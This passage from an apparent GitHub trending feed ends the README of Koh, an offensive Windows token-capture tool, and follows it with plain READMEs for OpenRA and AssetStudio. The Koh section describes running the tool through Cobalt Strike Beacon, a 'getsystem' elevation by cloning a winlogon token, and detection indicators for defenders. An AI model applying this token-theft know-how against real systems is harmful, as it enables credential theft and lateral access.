&#xA;&lt;ul&gt; &#xA; &lt;li&gt;Access is only usable as long as the system doesn&#39;t reboot.&lt;/li&gt; &#xA; &lt;li&gt;Doesn&#39;t let you reuse access on other systems &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;However, and existing ticket/credential extraction can still be done on the leaked logon session.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;May cause instability if a large number of sessions are leaked (though this can be mitigated with token group SID filtering) and restricting the maximum number of captured tokens (default of 1000 here).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;The Inline Shenanigans Bug&lt;/h2&gt; &#xA;&lt;p&gt;I&#39;ve been coding for a decent amount of time. This is one of the weirder and frustrating-to-track-down bugs I&#39;ve hit in a while - please help me with this lol.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When the Koh.exe assembly is run from an elevated (but non-SYSTEM) context, everything works properly.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If the Koh.exe assembly is run via Cobalt Strike&#39;s Beacon fork&amp;amp;run process with &lt;code&gt;execute-assembly&lt;/code&gt; from an elevated (but non-SYSTEM) context, everything works properly.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If the Koh.exe assembly is run &lt;em&gt;inline&lt;/em&gt; (via &lt;a href=&#34;https://github.com/anthemtotheego/InlineExecute-Assembly&#34;&gt;InlineExecute-Assembly&lt;/a&gt; or &lt;a href=&#34;https://github.com/kyleavery/inject-assembly&#34;&gt;Inject-Assembly&lt;/a&gt;) for a Cobalt Strike Beacon that&#39;s running in a SYSTEM context, everything works properly.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;However&lt;/strong&gt; If the Koh.exe assembly is run &lt;em&gt;inline&lt;/em&gt; (via &lt;a href=&#34;https://github.com/anthemtotheego/InlineExecute-Assembly&#34;&gt;InlineExecute-Assembly&lt;/a&gt; or &lt;a href=&#34;https://github.com/kyleavery/inject-assembly&#34;&gt;Inject-Assembly&lt;/a&gt;) for a Cobalt Strike Beacon that&#39;s running in an elevated, but not SYSTEM, context, the call to AcquireCredentialsHandle() fails with &lt;code&gt;SEC_E_NO_CREDENTIALS&lt;/code&gt; and everything fails ¯\_(ツ)_/¯&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;We have tried (with no success):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Spinning off everything to a separate thread, specifying a STA thread apartment.&lt;/li&gt; &#xA; &lt;li&gt;Trying to diagnose RPC weirdness (still more to investigate here).&lt;/li&gt; &#xA; &lt;li&gt;Using DuplicateTokenEx and SetThreadToken instead of ImpersonateLoggedOnUser.&lt;/li&gt; &#xA; &lt;li&gt;Checking if we have the proper SeTcbPrivilege right before the AcquireCredentialsHandle call (we do).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For all intents and purposes, the thread context right before the call to AcquireCredentialsHandle works in this context, but the result errors out. &lt;strong&gt;And we have no idea why.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you have an idea of what this might be, please let us know! And if you want to try playing around with a simpler assembly, check out the &lt;a href=&#34;https://github.com/harmj0y/AcquireCredentialsHandle&#34;&gt;AcquireCredentialsHandle&lt;/a&gt; repo on my GitHub for troubleshooting.&lt;/p&gt; &#xA;&lt;h2&gt;IOCs&lt;/h2&gt; &#xA;&lt;p&gt;To quote &lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;@tifkin_&lt;/a&gt; &lt;em&gt;&#34;Everything is stealthy until someone is looking for it.&#34;&lt;/em&gt; While Koh&#39;s approach is slightly different than others, there are still IOCs that can be used to detect it.&lt;/p&gt; &#xA;&lt;p&gt;The unique TypeLib GUID for the C# Koh collector is &lt;code&gt;4d5350c8-7f8c-47cf-8cde-c752018af17e&lt;/code&gt; as detailed in the Koh.yar Yara rule in this repo. If this is not changed on compilation, it should be a very high fidelity indicator of the Koh server.&lt;/p&gt; &#xA;&lt;p&gt;When the Koh server starts is opens up a named pipe called &lt;code&gt;\\.\pipe\imposecost&lt;/code&gt; that stays open as long as Koh is running. The default password used for Koh communication is &lt;code&gt;password&lt;/code&gt;, so sending &lt;code&gt;password list&lt;/code&gt; to any &lt;code&gt;\\.\pipe\imposecost&lt;/code&gt; pipe will let you confirm if Koh is indeed running. The default impersonation pipe used is &lt;code&gt;\\.pipe\imposingcost&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If Koh starts in an elevated context but not as SYSTEM, a handle/token clone of &lt;code&gt;winlogon&lt;/code&gt; is performed to perform a &lt;code&gt;getsystem&lt;/code&gt; type elevation.&lt;/p&gt; &#xA;&lt;p&gt;I&#39;m sure that no attackers will change the indicators mentioned above.&lt;/p&gt; &#xA;&lt;p&gt;There are likely some RPC artifacts for the token capture that we&#39;re hoping to investigate. We will update this section of the README if we find any additional detection artifacts along these lines. Hooking of some of the possibly-uncommon APIs used by Koh (&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions&#34;&gt;LsaEnumerateLogonSessions&lt;/a&gt; or the specific AcquireCredentialsHandle/InitializeSecurityContext/AcceptSecurityContext, specifically using a LUID in &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general&#34;&gt;AcquireCredentialsHandle&lt;/a&gt;) could be explored for effectiveness, but alas, I am not an EDR.&lt;/p&gt; &#xA;&lt;h2&gt;TODO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Additional testing in the lab and field. Possible concerns: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Stability in production environments, specifically intentional token leakage causing issues on highly-trafficked servers&lt;/li&gt; &#xA;   &lt;li&gt;Total actual effective token lifetime&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&#34;Remote&#34; client that allows for monitoring through the Koh named pipe remotely&lt;/li&gt; &#xA; &lt;li&gt;Implement more clients (PowerShell, C#, C++, etc.)&lt;/li&gt; &#xA; &lt;li&gt;Fix the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Koh/main/#the-inline-shenanigans-bug&#34;&gt;Inline Shenanigans Bug&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>OpenRA/OpenRA</title>
    <updated>2022-07-11T01:35:42Z</updated>
    <id>tag:github.com,2022-07-11:/OpenRA/OpenRA</id>
    <link href="https://github.com/OpenRA/OpenRA" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Open Source real-time strategy game engine for early Westwood games such as Command &amp; Conquer: Red Alert written in C# using SDL and OpenGL. Runs on Windows, Linux, *BSD and Mac OS X.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;OpenRA&lt;/h1&gt; &#xA;&lt;p&gt;A Libre/Free Real Time Strategy game engine supporting early Westwood classics.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Website: &lt;a href=&#34;https://www.openra.net&#34;&gt;https://www.openra.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Chat: &lt;a href=&#34;ircs://irc.libera.chat:6697/openra&#34;&gt;#openra on Libera&lt;/a&gt; (&lt;a href=&#34;https://web.libera.chat/#openra&#34;&gt;web&lt;/a&gt;) or &lt;a href=&#34;https://discord.openra.net&#34;&gt;Discord&lt;/a&gt; &lt;img src=&#34;https://discordapp.com/api/guilds/153649279762694144/widget.png&#34; alt=&#34;Discord Badge&#34;&gt;&lt;/li&gt; &#xA; &lt;li&gt;Repository: &lt;a href=&#34;https://github.com/OpenRA/OpenRA&#34;&gt;https://github.com/OpenRA/OpenRA&lt;/a&gt; &lt;img src=&#34;https://github.com/OpenRA/OpenRA/workflows/Continuous%20Integration/badge.svg?sanitize=true&#34; alt=&#34;Continuous Integration&#34;&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please read the &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/FAQ&#34;&gt;FAQ&lt;/a&gt; in our &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki&#34;&gt;Wiki&lt;/a&gt; and report problems at &lt;a href=&#34;https://github.com/OpenRA/OpenRA/issues&#34;&gt;https://github.com/OpenRA/OpenRA/issues&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Join the &lt;a href=&#34;https://forum.openra.net/&#34;&gt;Forum&lt;/a&gt; for discussion.&lt;/p&gt; &#xA;&lt;h2&gt;Play&lt;/h2&gt; &#xA;&lt;p&gt;Distributed mods include a reimagining of&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Command &amp;amp; Conquer: Red Alert&lt;/li&gt; &#xA; &lt;li&gt;Command &amp;amp; Conquer: Tiberian Dawn&lt;/li&gt; &#xA; &lt;li&gt;Dune 2000&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;EA has not endorsed and does not support this product.&lt;/p&gt; &#xA;&lt;p&gt;Check our &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Playing-the-game&#34;&gt;Playing the Game&lt;/a&gt; Guide to win multiplayer matches.&lt;/p&gt; &#xA;&lt;h2&gt;Contribute&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Please read &lt;a href=&#34;https://github.com/OpenRA/OpenRA/raw/bleed/INSTALL.md&#34;&gt;INSTALL.md&lt;/a&gt; and &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Compiling&#34;&gt;Compiling&lt;/a&gt; on how to set up an OpenRA development environment.&lt;/li&gt; &#xA; &lt;li&gt;See &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Hacking&#34;&gt;Hacking&lt;/a&gt; for a (now very outdated) overview of the engine.&lt;/li&gt; &#xA; &lt;li&gt;Read and follow our &lt;a href=&#34;https://github.com/OpenRA/OpenRA/raw/bleed/CODE_OF_CONDUCT.md&#34;&gt;Code of Conduct&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;To get your patches merged, please adhere to the &lt;a href=&#34;https://github.com/OpenRA/OpenRA/raw/bleed/CONTRIBUTING.md&#34;&gt;Contributing&lt;/a&gt; guidelines.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Mapping&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;We offer a &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Mapping&#34;&gt;Mapping&lt;/a&gt; Tutorial as you can change gameplay drastically with custom rules.&lt;/li&gt; &#xA; &lt;li&gt;For scripted mission have a look at the &lt;a href=&#34;https://docs.openra.net/en/latest/release/lua/&#34;&gt;Lua API&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;If you want to share your maps with the community, upload them at the &lt;a href=&#34;https://resource.openra.net&#34;&gt;OpenRA Resource Center&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Modding&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Download a copy of the &lt;a href=&#34;https://github.com/OpenRA/OpenRAModSDK&#34;&gt;OpenRA Mod SDK&lt;/a&gt; to start your own mod.&lt;/li&gt; &#xA; &lt;li&gt;Check the &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Modding-Guide&#34;&gt;Modding Guide&lt;/a&gt; to create your own classic RTS.&lt;/li&gt; &#xA; &lt;li&gt;There exists an auto-generated &lt;a href=&#34;https://docs.openra.net/en/latest/release/traits/&#34;&gt;Trait documentation&lt;/a&gt; to get started with yaml files.&lt;/li&gt; &#xA; &lt;li&gt;Some hints on how to create new OpenRA compatible &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Pixelart&#34;&gt;Pixelart&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Upload total conversions at &lt;a href=&#34;https://www.moddb.com/games/openra/mods&#34;&gt;our Mod DB profile&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Sponsor a &lt;a href=&#34;https://github.com/OpenRA/OpenRAWebsiteV3/tree/master/packages&#34;&gt;mirror server&lt;/a&gt; if you have some bandwidth to spare.&lt;/li&gt; &#xA; &lt;li&gt;You can immediately set up a &lt;a href=&#34;https://github.com/OpenRA/OpenRA/wiki/Dedicated&#34;&gt;Dedicated&lt;/a&gt; Game Server.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Copyright 2007-2022 The OpenRA Developers (see &lt;a href=&#34;https://github.com/OpenRA/OpenRA/raw/bleed/AUTHORS&#34;&gt;AUTHORS&lt;/a&gt;) This file is part of OpenRA, which is free software. It is made available to you under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. For more information, see &lt;a href=&#34;https://github.com/OpenRA/OpenRA/raw/bleed/COPYING&#34;&gt;COPYING&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Perfare/AssetStudio</title>
    <updated>2022-07-11T01:35:42Z</updated>
    <id>tag:github.com,2022-07-11:/Perfare/AssetStudio</id>
    <link href="https://github.com/Perfare/AssetStudio" rel="alternate"></link>
    <summary type="html">&lt;p&gt;AssetStudio is a tool for exploring, extracting and exporting assets and assetbundles.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AssetStudio&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://ci.appveyor.com/project/Perfare/assetstudio/branch/master/artifacts&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/rnu7l90422pdewx4?svg=true&#34; alt=&#34;Build status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;None of the repo, the tool, nor the repo owner is affiliated with, or sponsored or authorized by, Unity Technologies or its affiliates.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;AssetStudio is a tool for exploring, extracting and exporting assets and assetbundles.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Support version: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;3.4 - 2022.1&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Support asset types: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Texture2D&lt;/strong&gt; : convert to png, tga, jpeg, bmp&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Sprite&lt;/strong&gt; : crop Texture2D to png, tga, jpeg, bmp&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;AudioClip&lt;/strong&gt; : mp3, ogg, wav, m4a, fsb. support convert FSB file to WAV(PCM)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Font&lt;/strong&gt; : ttf, otf&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Mesh&lt;/strong&gt; : obj&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;TextAsset&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Shader&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;MovieTexture&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;VideoClip&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;MonoBehaviour&lt;/strong&gt; : json&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Animator&lt;/strong&gt; : export to FBX file with bound AnimationClip&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;AssetStudio.net472 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://dotnet.microsoft.com/download/dotnet-framework/net472&#34;&gt;.NET Framework 4.7.2&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;AssetStudio.net5 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://dotnet.microsoft.com/download/dotnet/5.0&#34;&gt;.NET Desktop Runtime 5.0&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;AssetStudio.net6 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://dotnet.microsoft.com/download/dotnet/6.0&#34;&gt;.NET Desktop Runtime 6.0&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Load Assets/AssetBundles&lt;/h3&gt; &#xA;&lt;p&gt;Use &lt;strong&gt;File-Load file&lt;/strong&gt; or &lt;strong&gt;File-Load folder&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When AssetStudio loads AssetBundles, it decompresses and reads it directly in memory, which may cause a large amount of memory to be used. You can use &lt;strong&gt;File-Extract file&lt;/strong&gt; or &lt;strong&gt;File-Extract folder&lt;/strong&gt; to extract AssetBundles to another folder, and then read.&lt;/p&gt; &#xA;&lt;h3&gt;Extract/Decompress AssetBundles&lt;/h3&gt; &#xA;&lt;p&gt;Use &lt;strong&gt;File-Extract file&lt;/strong&gt; or &lt;strong&gt;File-Extract folder&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Export Assets&lt;/h3&gt; &#xA;&lt;p&gt;use &lt;strong&gt;Export&lt;/strong&gt; menu.&lt;/p&gt; &#xA;&lt;h3&gt;Export Model&lt;/h3&gt; &#xA;&lt;p&gt;Export model from &#34;Scene Hierarchy&#34; using the &lt;strong&gt;Model&lt;/strong&gt; menu.&lt;/p&gt; &#xA;&lt;p&gt;Export Animator from &#34;Asset List&#34; using the &lt;strong&gt;Export&lt;/strong&gt; menu.&lt;/p&gt; &#xA;&lt;h4&gt;With AnimationClip&lt;/h4&gt; &#xA;&lt;p&gt;Select model from &#34;Scene Hierarchy&#34; then select the AnimationClip from &#34;Asset List&#34;, using &lt;strong&gt;Model-Export selected objects with AnimationClip&lt;/strong&gt; to export.&lt;/p&gt; &#xA;&lt;p&gt;Export Animator will export bound AnimationClip or use &lt;strong&gt;Ctrl&lt;/strong&gt; to select Animator and AnimationClip from &#34;Asset List&#34;, using &lt;strong&gt;Export-Export Animator with selected AnimationClip&lt;/strong&gt; to export.&lt;/p&gt; &#xA;&lt;h3&gt;Export MonoBehaviour&lt;/h3&gt; &#xA;&lt;p&gt;When you select an asset of the MonoBehaviour type for the first time, AssetStudio will ask you the directory where the assembly is located, please select the directory where the assembly is located, such as the &lt;code&gt;Managed&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;h4&gt;For Il2Cpp&lt;/h4&gt; &#xA;&lt;p&gt;First, use my another program &lt;a href=&#34;https://github.com/Perfare/Il2CppDumper&#34;&gt;Il2CppDumper&lt;/a&gt; to generate dummy dll, then when using AssetStudio to select the assembly directory, select the dummy dll folder.&lt;/p&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Visual Studio 2022 or newer&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;AssetStudioFBXNative&lt;/strong&gt; uses &lt;a href=&#34;https://www.autodesk.com/developer-network/platform-technologies/fbx-sdk-2020-2-1&#34;&gt;FBX SDK 2020.2.1&lt;/a&gt;, before building, you need to install the FBX SDK and modify the project file, change include directory and library directory to point to the FBX SDK directory&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Open source libraries used&lt;/h2&gt; &#xA;&lt;h3&gt;Texture2DDecoder&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Ishotihadus/mikunyan&#34;&gt;Ishotihadus/mikunyan&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/BinomialLLC/crunch&#34;&gt;BinomialLLC/crunch&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Unity-Technologies/crunch/tree/unity&#34;&gt;Unity-Technologies/crunch&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>